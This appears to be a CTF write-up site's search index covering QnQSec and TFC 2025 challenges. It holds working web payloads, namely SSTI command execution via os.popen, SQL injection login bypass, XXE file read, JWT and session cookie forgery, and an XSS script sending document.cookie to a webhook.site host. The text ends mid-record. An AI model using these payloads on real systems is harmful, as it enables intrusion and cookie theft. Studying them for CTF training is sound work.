0001}\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Hardware/SmartCoffee/","title":"SmartCoffee","text":""},{"location":"QnQSec%20CTF%202025/Hardware/SmartCoffee/#files-provided","title":"Files Provided","text":"<p>A binary <code>firmware_x86.elf</code> and <code>logs.txt</code></p>"},{"location":"QnQSec%20CTF%202025/Hardware/SmartCoffee/#approach","title":"Approach","text":"<p>Executing the binary gives the following output:</p> <pre><code>Initializing ADC... OK\nI2C devices found: 2\nLoading EEPROM... OK\nDevice Serial: SC-01-ABC123\nEEPROM DUMP (raw):\n95 aa 95 97 a1 a7 bf f7 \nbc 9b b7 f7 b7 aa b1 a9 \n9b a7 f0 aa 9b a0 f4 9b \nac f0 b6 a0 b3 f0 b6 f7 \nb9 \n(Note: bytes are likely obfuscated.)\nEntering diagnostic loop...\ndiag_ok\ndiag_ok\ndiag_ok\n</code></pre> <p>We know the flag format is <code>QnQSec{...}</code>, and the 1st &amp; 3rd byte in the dump are same. The obfuscation could be XOR</p>"},{"location":"QnQSec%20CTF%202025/Hardware/SmartCoffee/#solve-script","title":"Solve Script","text":"<pre><code>dump = \"\"\"\n95 aa 95 97 a1 a7 bf f7 \nbc 9b b7 f7 b7 aa b1 a9 \n9b a7 f0 aa 9b a0 f4 9b \nac f0 b6 a0 b3 f0 b6 f7 \nb9\n\"\"\"\n\ndata = bytes(int(byte, 16) for byte in dump.split())\nkey = ord('Q') ^ 0x95\ndecoded = bytes(byte ^ key for byte in data)\nprint(decoded.decode('utf-8'))\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Misc/Catch%20Me/","title":"Catch Me","text":""},{"location":"QnQSec%20CTF%202025/Misc/Catch%20Me/#files-provided","title":"Files Provided","text":"<p>A GIF of many QRs</p> <p></p>"},{"location":"QnQSec%20CTF%202025/Misc/Catch%20Me/#approach","title":"Approach","text":"<p>Converted the GIF to a collection of JPGs online</p> <p>Scanning every QR displayed a text looked like Base64-decoding</p>"},{"location":"QnQSec%20CTF%202025/Misc/Catch%20Me/#solve-script","title":"Solve Script","text":"<pre><code>import os\nimport base64\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\n\ndir_path = \"iloveimg-converted\"\n\nfor filename in sorted(os.listdir(dir_path)):\n    if filename.lower().endswith((\".png\", \".jpg\", \".jpeg\")):\n        file_path = os.path.join(dir_path, filename)\n        img = Image.open(file_path)\n        result = decode(img)\n\n        if result:\n            for r in result:\n                qr_data = r.data.decode(\"utf-8\")\n                try:\n                    decoded = base64.b64decode(qr_data).decode(\"utf-8\")\n                    print(decoded)\n                except Exception as e:\n                    pass\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Warmup/A%20easy%20web/","title":"A easy web","text":""},{"location":"QnQSec%20CTF%202025/Warmup/A%20easy%20web/#files-provided","title":"Files Provided","text":"<p><code>Dockerfile</code>:</p> <pre><code>FROM python:3.11-slim\n\nWORKDIR /app\n\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# \u8907\u88fd\u7a0b\u5f0f\u78bc\nCOPY . .\n\nRUN mkdir -p /app/.hidden &amp;&amp; \\\n    mv /app/flag.txt /app/.hidden/flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt &amp;&amp; \\\n    chown -R nobody:nogroup /app\n\nEXPOSE 5000\n\nUSER nobody\n\nCMD [\"python\", \"app.py\"]\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Warmup/A%20easy%20web/#approach","title":"Approach","text":"<p><code>/</code>:</p> <p></p> <p><code>/profile?uid=1</code>:</p> <p></p> <p>Tried running a script to check all uids from 1 to 100 -&gt; no luck</p> <p>Guessed <code>1337</code> (because of its significance), and it worked!</p> <p></p> <p>Clicking on admin panel, we are taken to <code>/admin?cmd=whoami&amp;uid=1337</code>:</p> <p></p> <p>Typing commands in the text box and clicking \"Run\" gives \"Access Denied\". But providing commands in query params works!</p> <p>Using <code>ls -a</code> commands, found out the random name of the flag file and then <code>cat</code> it</p>"},{"location":"QnQSec%20CTF%202025/Warmup/Echoes%20of%20the%20Unknown/","title":"Echoes of the Unknown","text":""},{"location":"QnQSec%20CTF%202025/Warmup/Echoes%20of%20the%20Unknown/#files-provided","title":"Files Provided","text":"<p>An audio file alien.wav</p>"},{"location":"QnQSec%20CTF%202025/Warmup/Echoes%20of%20the%20Unknown/#approach","title":"Approach","text":"<p>Spectogram of the wav file in Audacity:</p> <p></p>"},{"location":"QnQSec%20CTF%202025/Warmup/Mandatory%20RSA/","title":"Mandatoory RSA","text":""},{"location":"QnQSec%20CTF%202025/Warmup/Mandatory%20RSA/#given","title":"Given","text":"<pre><code>n = 30610867131545893573245403370929044810375908252345734515216335567761070674235240557970829245356614030481955825874376565524126172250295479286829004996105122106474627414932278394880727207687247106535964451736524423676062227917939094755601312619938974463767105253817030590414646900543888347805544511989816392901347341338737906837896070023751031260815782973250734600300683094949304509692321753534435264794596296780586539085130232106649876660029506699244567866816756904364396378546670735017278059889632347338673055259053699246622809620909022329749464060132071464884484682112534813343645706384624586841979729464134335809829\ne = 13118943056376811531390887158969590633018246393862457649378429529040458860386531667701783962295691727349409639660447099510339788107269491122926716426902195188489126034970976454948883089008820188515413336458510467289740954821973897752400562551402417627328759394493013110177705814518809291916661933709921311243284600780240090861401353930215487292827235572235250164436683130292475464090785626013810206032736933354696930489144983575446495078404329829091193678240029445525658582548485531996972340914370823232033916046942293331266006647674886928834212203547468218609381456317192256524737280398698305720035095438106008915543\nc = 18491889164810617543569456750416875989184817880137548014973592642069416208831086398288449741333647958301433206462225905089767171227296166302076329585813204145393998300807912284373441125769784091235480355305999860836226228064817001671079683866140595167104080925862489688205706558563994071054217252661751197090938128540101902284587959897970686920835999487758527543265902558413502613239565915919268373782402562042295965144636399280059309987259722405692758942811072888497222424752062745376152606372092707679048892146955016482797824514120865462676167840311292744307891590740707933408465096337716317714272609074408402855672\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Warmup/Mandatory%20RSA/#solution","title":"Solution","text":"<p>Online decoder worked</p>"},{"location":"QnQSec%20CTF%202025/Warmup/baby_baby_reverse/","title":"baby_baby_reverse","text":""},{"location":"QnQSec%20CTF%202025/Warmup/baby_baby_reverse/#files-provided","title":"Files Provided","text":"<p>A binary <code>main</code></p>"},{"location":"QnQSec%20CTF%202025/Warmup/baby_baby_reverse/#approachh","title":"Approachh","text":"<p>Decompiled the binary online</p> <pre><code>int32_t main(int32_t argc, char** argv, char** envp)\n{\n    void* fsbase;\n    int64_t rax = *(fsbase + 0x28);\n    int64_t var_228;\n    __builtin_strcpy(&amp;var_228, \"Th1s_1s_th3_k3y\");\n    printf(\"Enter flag: \", argv, 0x79336b5f336874);\n    char buf[0x208];\n    int32_t result;\n\n    if (fgets(&amp;buf, 0x200, __TMC_END__))\n    {\n        uint64_t var_248_1 = strlen(&amp;buf);\n\n        if (var_248_1 &amp;&amp; buf[var_248_1 - 1] == 0xa)\n        {\n            buf[var_248_1 - 1] = 0;\n            var_248_1 -= 1;\n        }\n\n        if (var_248_1 == 0x29)\n        {\n            char var_24b_1 = 1;\n            char var_24a_1 = 0;\n\n            for (int64_t i = 0; i &lt; 0x29; i += 1)\n                var_24a_1 |= *(i + &amp;encrypted) ^ *(&amp;var_228 + COMBINE(0, i) % 0xf) ^ buf[i];\n\n            char var_24b_2;\n\n            var_24b_2 = var_24a_1 ? 0 : 1;\n\n            if (!var_24b_2)\n                puts(\"Wrong!\");\n            else\n                puts(\"Correct!\");\n\n            result = 0;\n        }\n        else\n        {\n            puts(\"Wrong!\");\n            result = 0;\n        }\n    }\n    else\n    {\n        puts(\"Input error\");\n        result = 1;\n    }\n\n    *(fsbase + 0x28);\n\n    if (rax == *(fsbase + 0x28))\n        return result;\n\n    __stack_chk_fail();\n    /* no return */\n}\n</code></pre> <p>Find the address of <code>encrypted</code>:</p> <pre><code>readelf -sW main | grep -i encrypted\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Warmup/baby_baby_reverse/#solve-script","title":"Solve Script","text":"<pre><code>from pwn import ELF\nimport sys\n\nbinpath = \"./main\"\ne = ELF(binpath)\naddr = 0x4060\nlength = 41\ndata = e.read(addr, length)\nkey = b\"Th1s_1s_th3_k3y\"\nflag = bytes([ data[i] ^ key[i % len(key)] for i in range(length) ])\nprint(flag.decode('utf-8', errors='replace'))\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Web/QnQsec%20portal/","title":"QnQsec portal","text":""},{"location":"QnQSec%20CTF%202025/Web/QnQsec%20portal/#files-provided","title":"Files Provided","text":"<p><code>app.py</code>:</p> <pre><code>import os\nimport sqlite3\nimport secrets\nimport hashlib\nfrom hashlib import md5\nfrom datetime import datetime, timedelta, timezone\n\nimport jwt\nfrom flask import (\n    Flask, request, render_template, redirect, session,\n    flash, url_for, g, abort, make_response\n)\n\nfrom admin_routes import admin_bp,generate_jwt\n\n\nBASE_DIR = os.path.abspath(os.path.dirname(__file__))\nSECRET_DIR = os.path.join(BASE_DIR, 'secret')\nFLAG_PATH = os.path.join(SECRET_DIR, 'flag.txt')\nFLAG_PREFIX = 'QnQsec'\n\n\ndef ensure_flag():\n    os.makedirs(SECRET_DIR, exist_ok=True)\n    if not os.path.exists(FLAG_PATH):\n        with open(FLAG_PATH, 'w') as f:\n            f.write(f\"{FLAG_PREFIX}{{{secrets.token_hex(16)}}}\")\n\n\nensure_flag()\n\n\napp = Flask(__name__)\nbase = os.environ.get(\"Q_SECRET\", \"qnqsec-default\")\napp.config['SECRET_KEY'] = hashlib.sha1((\"pepper:\" + base).encode()).hexdigest()\napp.config['JWT_SECRET'] = hashlib.sha256((\"jwtpepper:\" + base).encode()).hexdigest()\napp.config['JWT_EXPIRES_MIN'] = 60\n\n\napp.register_blueprint(admin_bp)\n\n\nDB_PATH = os.path.join(BASE_DIR, 'users.db')\n\n\ndef get_db():\n    if 'db' not in g:\n        g.db = sqlite3.connect(DB_PATH, timeout=10)\n        g.db.row_factory = sqlite3.Row\n    return g.db\n\n\n@app.teardown_appcontext\ndef close_db(_exc):\n    db = g.pop('db', None)\n    if db is not None:\n        db.close()\n\n\ndef init_db():\n    with sqlite3.connect(DB_PATH, timeout=10) as db:\n        db.execute('PRAGMA journal_mode=WAL')\n        db.execute('drop table if exists users')\n        db.execute('create table users(username text primary key, password text not null)')\n\n        db.execute('insert into users values(\"flag\", \"401b0e20e4ccf7a8df254eac81e269a0\")')\n        db.commit()\n\n\nif not os.path.exists(DB_PATH):\n    init_db()\n\n\n@app.route('/')\ndef index():\n    return redirect(url_for('login'))\n\n\n@app.route('/sign_up', methods=['GET', 'POST'])\ndef sign_up():\n    if request.method == 'GET':\n        return render_template('sign_up.html')\n\n    username = (request.form.get('username') or '').strip()\n    password = request.form.get('password') or ''\n    if not username or not password:\n        flash('Missing username or password', 'error')\n        return render_template('sign_up.html')\n\n    try:\n        db = get_db()\n        db.execute(\n            'insert into users values(lower(?), ?)',\n            (username, md5(password.encode()).hexdigest())\n        )\n        db.commit()\n        flash(f'User {username} created', 'message')\n        return redirect(url_for('login'))\n    except sqlite3.IntegrityError:\n        flash('Username is already registered', 'error')\n        return render_template('sign_up.html')\n\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'GET':\n        return render_template('login.html')\n\n    username = (request.form.get('username') or '').strip()\n    password = request.form.get('password') or ''\n    if not username or not password:\n        flash('Missing username or password', 'error')\n        return render_template('login.html')\n\n    db = get_db()\n    row = db.execute(\n        'select username, password from users where username = lower(?) and password = ?',\n        (username, md5(password.encode()).hexdigest())\n    ).fetchone()\n\n    if row:\n        session['user'] = username.title()\n\n\n        role = \"admin\" if username.lower() == \"flag\" else \"user\"\n        token = generate_jwt(session['user'],role,app.config['JWT_EXPIRES_MIN'],app.config['JWT_SECRET'])\n\n        resp = make_response(redirect(url_for('account')))\n        resp.set_cookie(\"admin_jwt\", token, httponly=False, samesite=\"Lax\")\n        return resp\n\n    flash('Invalid username or password', 'error')\n    return render_template('login.html')\n\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    resp = make_response(redirect(url_for('login')))\n    resp.delete_cookie(\"admin_jwt\")\n    return resp\n\n\n@app.route('/account')\ndef account():\n    user = session.get('user')\n    if not user:\n        return redirect(url_for('login'))\n    if user == 'Flag':\n        return render_template('account.html', user=user, is_admin=True)\n    return render_template('account.html', user=user, is_admin=False)\n\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Web/QnQsec%20portal/#approach","title":"Approach","text":"<p>Firstly, a login screen is displayed.</p> <p></p> <p>From the source code, it's clear that we need to login as \"Flag\", but we only have its md5-hashed password. John the Ripper with <code>rockyou.txt</code> couldn't decrypt it.</p> <p>Registering with some username (\"user52\") and password (\"pass\") and then logging in sets two cookies: <code>admin_jwt</code> and <code>session</code></p> <p></p> <p>On jwt.io, decoding the <code>admin_jwt</code> cookie value gives a payload that contains <code>\"sub\":\"hello\", \"role\":\"User\"</code></p> <pre><code>base = os.environ.get(\"Q_SECRET\", \"qnqsec-default\")\napp.config['SECRET_KEY'] = hashlib.sha1((\"pepper:\" + base).encode()).hexdigest()\napp.config['JWT_SECRET'] = hashlib.sha256((\"jwtpepper:\" + base).encode()).hexdigest()\n</code></pre> <p>On the same website, we can verify if a given JWT key is valid or not for the provided token. The SHA256 hash of <code>jwtpepper:qnqsec-default</code> worked! So, the value of <code>base</code> is <code>qnqsec-default</code>.</p> <p></p> <p>Now, we can encode a new jwt token with <code>\"sub\":\"Flag\", \"role\":\"admin\"</code>; and use Flask to create a new session token with <code>\"user\":\"Flag\"</code></p> <p></p> <pre><code>from flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\n\ndef generate_flask_session(payload, secret_key):\n    app = Flask(__name__)\n    app.secret_key = secret_key\n\n    si = SecureCookieSessionInterface()\n    serializer = si.get_signing_serializer(app)\n\n    return serializer.dumps(payload)\n\nif __name__ == \"__main__\":\n    SECRETKEY = \"40913aa300c33db34d976a59975adf18d90a246a\" # SHA1 of 'pepper:qnqsec-default'\n    payload = {\"user\": \"Flag\"}\n    cookie_value = generate_flask_session(payload, SECRETKEY)\n    print(cookie_value)\n</code></pre> <p>Set these cookies to the updated values and go to the <code>/account</code> endpoint.</p> <p></p> <p></p> <p>A form is displayed which asks us to provide a template which it will render. This is obviously SSTI. Verified by rendering <code>{{ 7 * '7'}}</code>, it outputs <code>7777777</code></p> <p>Step-by-step payload to get the flag:</p> <pre><code>{{ request.application.__globals__.__builtins__.__import__('os').popen('find / -name *flag*').read() }}\n{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /app/secret/flag.txt').read() }}\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Web/s3cr3t_w3b/","title":"s3cr3t_w3b","text":""},{"location":"QnQSec%20CTF%202025/Web/s3cr3t_w3b/#files-provided","title":"Files Provided","text":"<pre><code>\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 flag.txt\n\u251c\u2500\u2500 includes\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 db.php\n\u251c\u2500\u2500 public\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 api.php\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.php\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 login.php\n\u2514\u2500\u2500 sql\n    \u2514\u2500\u2500 init.sql\n</code></pre> <p><code>api.php</code>:</p> <pre><code>&lt;?php\nsession_start();\n\nheader('Content-Type: application/json');\n\nif (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {\n    http_response_code(401);\n    echo json_encode(['error' =&gt; 'Not authenticated']);\n    exit();\n}\n\nif ($_SERVER['REQUEST_METHOD'] === 'GET') {\n    http_response_code(200);\n    echo json_encode(['status' =&gt; 'authenticated', 'user' =&gt; $_SESSION['username'] ?? 'unknown']);\n    exit();\n}\n\n$xml = file_get_contents('php://input');\n\nif (empty($xml)) {\n    http_response_code(400);\n    echo json_encode(['error' =&gt; 'No XML data provided']);\n    exit();\n}\n\n$dom = new DOMDocument();\n$dom-&gt;resolveExternals = true;\n$dom-&gt;substituteEntities = true;\n\nif (!@$dom-&gt;loadXML($xml, LIBXML_DTDLOAD | LIBXML_NOENT)) {\n    http_response_code(400);\n    echo json_encode(['error' =&gt; 'Invalid XML format']);\n    exit();\n}\n\n// Return the processed XML\nheader('Content-Type: application/xml');\necho $dom-&gt;saveXML();\n\n?&gt;\n</code></pre> <p><code>index.php</code>:</p> <pre><code>&lt;!doctype html&gt;\n&lt;html lang=\"zh-TW\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;XML Viewer&lt;/title&gt;\n&lt;style&gt;\nbody {\n font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n background: #f0f2f5;\n display: flex;\n justify-content: center;\n align-items: center;\n min-height: 100vh;\n margin: 0;\n padding: 20px;\n box-sizing: border-box;\n}\n.container {\n background: #fff;\n padding: 30px;\n border-radius: 12px;\n box-shadow: 0 8px 20px rgba(0,0,0,0.1);\n width: 100%;\n max-width: 600px;\n text-align: center;\n}\nh1 {\n margin-bottom: 20px;\n color: #333;\n}\n.file-input-wrapper {\n margin-bottom: 15px;\n}\ninput[type=\"file\"] {\n padding: 10px;\n border: 2px dashed #007BFF;\n border-radius: 8px;\n background: #f8f9fa;\n width: 100%;\n box-sizing: border-box;\n}\nbutton {\n padding: 10px 20px;\n background: #007BFF;\n color: #fff;\n border: none;\n border-radius: 8px;\n cursor: pointer;\n font-size: 16px;\n transition: background 0.3s;\n}\nbutton:hover {\n background: #0056b3;\n}\nbutton:disabled {\n background: #ccc;\n cursor: not-allowed;\n}\n.result-container {\n margin-top: 20px;\n}\npre {\n text-align: left;\n background: #f8f9fa;\n padding: 15px;\n border-radius: 8px;\n max-height: 400px;\n overflow-y: auto;\n white-space: pre-wrap;\n word-break: break-word;\n border: 1px solid #e9ecef;\n}\n.error {\n color: #dc3545;\n background: #f8d7da;\n border-color: #f5c6cb;\n}\n.success {\n color: #155724;\n background: #d4edda;\n border-color: #c3e6cb;\n}\n.loading {\n color: #856404;\n background: #fff3cd;\n border-color: #ffeaa7;\n}\n.auth-message {\n margin-top: 10px;\n padding: 10px;\n border-radius: 5px;\n font-size: 14px;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=\"container\"&gt;\n &lt;h1&gt;XML Viewer&lt;/h1&gt;\n\n &lt;div id=\"authStatus\" class=\"auth-message\" style=\"display: none;\"&gt;&lt;/div&gt;\n\n &lt;form id=\"xmlForm\"&gt;\n  &lt;div class=\"file-input-wrapper\"&gt;\n   &lt;input type=\"file\" id=\"xmlFile\" accept=\".xml,.txt\"&gt;\n  &lt;/div&gt;\n  &lt;button type=\"submit\" id=\"submitBtn\"&gt;Upload and Parse&lt;/button&gt;\n &lt;/form&gt;\n\n &lt;div class=\"result-container\"&gt;\n  &lt;pre id=\"result\"&gt;Select an XML file and click \"Upload and Parse\" to view the formatted XML.&lt;/pre&gt;\n &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;script&gt;\nwindow.addEventListener('load', async () =&gt; {\n try {\n  const response = await fetch('api.php', {\n   method: 'GET',\n   credentials: 'include'\n  });\n\n  const authStatus = document.getElementById('authStatus');\n\n  if (response.status === 401) {\n   authStatus.textContent = 'Authentication required. Redirecting to login...';\n   authStatus.className = 'auth-message error';\n   authStatus.style.display = 'block';\n\n   setTimeout(() =&gt; {\n    window.location.href = 'login.php';\n   }, 2000);\n   return;\n  }\n\n  if (response.ok) {\n   authStatus.textContent = 'Authentication successful';\n   authStatus.className = 'auth-message success';\n   authStatus.style.display = 'block';\n\n   setTimeout(() =&gt; {\n    authStatus.style.display = 'none';\n   }, 3000);\n  }\n } catch (err) {\n  console.error('Authentication check failed:', err);\n  const authStatus = document.getElementById('authStatus');\n  authStatus.textContent = 'Authentication check failed. Redirecting to login...';\n  authStatus.className = 'auth-message error';\n  authStatus.style.display = 'block';\n\n  setTimeout(() =&gt; {\n   window.location.href = 'login.php';\n  }, 2000);\n }\n});\n\nconst form = document.getElementById('xmlForm');\nconst result = document.getElementById('result');\nconst submitBtn = document.getElementById('submitBtn');\n\nform.addEventListener('submit', async (e) =&gt; {\n e.preventDefault();\n\n const fileInput = document.getElementById('xmlFile');\n if (!fileInput.files.length) {\n  alert('Please select an XML file');\n  return;\n }\n\n const file = fileInput.files[0];\n\n submitBtn.disabled = true;\n submitBtn.textContent = 'Processing...';\n result.textContent = 'Processing XML file...';\n result.className = 'loading';\n\n try {\n  const content = await file.text();\n\n  const response = await fetch('api.php', {\n   method: 'POST',\n   headers: { 'Content-Type': 'application/xml' },\n   body: content,\n   credentials: 'include'\n  });\n\n  if (response.status === 401) {\n   result.textContent = 'Authentication failed. Redirecting to login...';\n   result.className = 'error';\n   setTimeout(() =&gt; {\n    window.location.href = 'login.php';\n   }, 2000);\n   return;\n  }\n\n  const text = await response.text();\n\n  if (response.ok) {\n   result.textContent = text;\n   result.className = 'success';\n  } else {\n   result.textContent = 'Error: ' + text;\n   result.className = 'error';\n  }\n\n } catch (err) {\n  result.textContent = 'Error: ' + err.message;\n  result.className = 'error';\n } finally {\n  submitBtn.disabled = false;\n  submitBtn.textContent = 'Upload and Parse';\n }\n});\n\ndocument.getElementById('xmlFile').addEventListener('change', function(e) {\n const file = e.target.files[0];\n if (file) {\n  result.textContent = `Selected file: ${file.name} (${(file.size / 1024).toFixed(2)} KB)`;\n  result.className = '';\n }\n});\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p><code>login.php</code>:</p> <pre><code>&lt;?php\nsession_start();\n\n$host = 'db';\n$db   = 'login_db';\n$user = 'root_users';\n$pass = 'root'; \n$charset = 'utf8mb4';\n\n$dsn = \"mysql:host=$host;dbname=$db;charset=$charset\";\n$options = [\n    PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION,\n    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,\n];\n\ntry {\n    $pdo = new PDO($dsn, $user, $pass, $options);\n} catch (PDOException $e) {\n    die(\"Database connection failed: \" . $e-&gt;getMessage());\n}\n\n$user_data = null;\n$error = null;\n\nif (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    $query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n\n    try {\n        $stmt = $pdo-&gt;query($query);\n        $user_data = $stmt-&gt;fetch();\n    } catch (PDOException $e) {\n        error_log(\"SQL Error: \" . $e-&gt;getMessage());\n        $user_data = false;\n        $error = \"Database error occurred\";\n    }\n\n    if ($user_data) {\n        $_SESSION['logged_in'] = true;\n        $_SESSION['username'] = $user_data['username'];\n        $_SESSION['role'] = $user_data['role'] ?? 'user';\n        header('Location: index.php');\n        exit();\n    } else {\n        $error = $error ?? \"Invalid username or password!\";\n    }\n}\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Login - XML Parser&lt;/title&gt;\n    &lt;style&gt;\n        body {\n            font-family: Arial, sans-serif;\n            max-width: 400px;\n            margin: 100px auto;\n            padding: 20px;\n            background-color: #f5f5f5;\n        }\n        .login-container {\n            background: white;\n            padding: 30px;\n            border-radius: 8px;\n            box-shadow: 0 2px 10px rgba(0,0,0,0.1);\n        }\n        h2 {\n            text-align: center;\n            color: #333;\n            margin-bottom: 30px;\n        }\n        .form-group {\n            margin-bottom: 20px;\n        }\n        label {\n            display: block;\n            margin-bottom: 5px;\n            color: #555;\n        }\n        input[type=\"text\"], input[type=\"password\"] {\n            width: 100%;\n            padding: 10px;\n            border: 1px solid #ddd;\n            border-radius: 4px;\n            box-sizing: border-box;\n        }\n        button {\n            width: 100%;\n            padding: 12px;\n            background-color: #007bff;\n            color: white;\n            border: none;\n            border-radius: 4px;\n            cursor: pointer;\n            font-size: 16px;\n        }\n        button:hover {\n            background-color: #0056b3;\n        }\n        .error {\n            color: #dc3545;\n            margin-top: 10px;\n            padding: 10px;\n            background-color: #f8d7da;\n            border: 1px solid #f5c6cb;\n            border-radius: 4px;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"login-container\"&gt;\n        &lt;h2&gt;Login to XML Parser&lt;/h2&gt;\n\n        &lt;form method=\"POST\"&gt;\n            &lt;div class=\"form-group\"&gt;\n                &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n                &lt;input type=\"text\" id=\"username\" name=\"username\" required&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"form-group\"&gt;\n                &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n                &lt;input type=\"password\" id=\"password\" name=\"password\" required&gt;\n            &lt;/div&gt;\n\n            &lt;button type=\"submit\"&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n\n        &lt;?php if (isset($error)): ?&gt;\n            &lt;div class=\"error\"&gt;\n                &lt;?php echo htmlspecialchars($error); ?&gt;\n            &lt;/div&gt;\n        &lt;?php endif; ?&gt;\n\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p><code>Dockerfile</code>:</p> <pre><code>FROM php:8.2-apache\n\n\nRUN docker-php-ext-install pdo pdo_mysql\n\nRUN a2enmod rewrite\n\nCOPY public/ /var/www/html/\nCOPY includes/ /var/www/html/includes/\nCOPY flag.txt /var/www/html/\n\nWORKDIR /var/www/html/\n\nEXPOSE 80\n</code></pre>"},{"location":"QnQSec%20CTF%202025/Web/s3cr3t_w3b/#approach","title":"Approach","text":"<p>Firstly, a login screen is displayed.</p> <p></p> <pre><code>$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n</code></pre> <p>This is prone to SQLi. Submitting the following worked:</p> <pre><code>username: ' OR '1'='1\npassword: ' OR '1'='1\n</code></pre> <p></p> <p>After logging in, a page opens which accepts an XML file and parses it. This is a sink for XXE Injection</p> <p>Working payload:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE root [\n  &lt;!ENTITY xxe SYSTEM \"file:///var/www/html/flag.txt\"&gt;\n]&gt;\n&lt;root&gt;\n  &lt;data&gt;&amp;xxe;&lt;/data&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"TFC%20CTF%202025/Web/KISSFIXESS%20REVENGE/","title":"KISSFIXESS REVENGE","text":"<pre><code>Okay, NOW ain't nobody gonna solve it.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>76</code></p> <p>author: <code>hofill</code></p> <p>This is a sequel to the KISSFIXESS challenge</p> <p>This time, more strings are banned:</p> <pre><code>banned = [\"s\", \"l\", \"(\", \")\", \"self\", \"_\", \".\", \"\\\"\", \"\\\\\", \"&amp;\", \"%\", \"^\", \"#\", \"@\", \"!\", \"*\", \"-\", \"import\", \"eval\", \"exec\", \"os\", \";\", \",\", \"|\", \"JAVASCRIPT\", \"window\", \"atob\", \"btoa\", \"=\"]\n</code></pre> <p>Python evaluates <code>pow</code> as follows. Characters from the output can be used</p> <pre><code>&gt;&gt;&gt; pow\n&lt;built-in function pow&gt;\n</code></pre> <p></p> <p><code>self</code> is not allowed, but italicized self :</p> <p></p> <p>Solve script (credits: @CerealSoup):</p> <pre><code>from base64 import b64encode\n\nsubstitutions = {\n    \"&amp;\": \"${banned[0]}\",\n    \"&lt;\": \"${banned[1]}\",\n    \"&gt;\": \"${banned[2]}\",\n    \"(\": \"${banned[3]}\",\n    \")\": \"${banned[4]}\",\n    \".\": \"${f'{\ud835\ude34\ud835\ude26\ud835\ude2d\ud835\ude27}'[5]}\",\n    \"l\": \"${f'{pow}'[4]}\",\n    \"s\": \"${f'{\ud835\ude34\ud835\ude26\ud835\ude2d\ud835\ude27}'[26]}\",\n    \"window\": \"w${f'{pow}'[3]}ndow\",\n    \"atob\": \"ato${f'{pow}'[1]}\",\n}\n\n\njs_payload = b\"fetch('https://webhook.site/51db469d-d555-4496-b6fc-9cc9d9344385/?flag=' + document.cookie);;\"\n# Extra ';' in the js_payload is to add padding since '=' is not allowed and the payload is going to be base64-encoded\n\nencoded = b64encode(js_payload).decode()\npayload = f\"&lt;/div&gt;&lt;SCRIPT&gt;eval(window.atob(`{encoded}`))&lt;/SCRIPT&gt;\"\n\nfor key, sub in substitutions.items():\n    payload = payload.replace(key, sub)\n\nprint(payload)\n</code></pre> <p>GOATed Pyjail cheatsheet</p>"},{"location":"TFC%20CTF%202025/Web/KISSFIXESS/","title":"KISSFIXESS","text":"<pre><code>Kiss My Fixes.\n\nAin't nobody solving this now.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>95</code></p> <p>author: <code>hofill</code></p>"},{"location":"TFC%20CTF%202025/Web/KISSFIXESS/#files-provided","title":"Files Provided","text":"<pre><code>public/\n\u251c\u2500\u2500 bot.py\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 main.py\n\u251c\u2500\u2500 requirements.txt\n\u2514\u2500\u2500 start_docker.sh\n</code></pre> <p><code>Dockerfile</code>:</p> <pre><code>FROM python:3.9-slim\n\n# avoid prompts and keep image lean\nENV DEBIAN_FRONTEND=noninteractive\n\n# install Chromium, Chromedriver and needed libs\nRUN apt-get update \\\n &amp;&amp; apt-get install -y --no-install-recommends \\\n    chromium \\\n    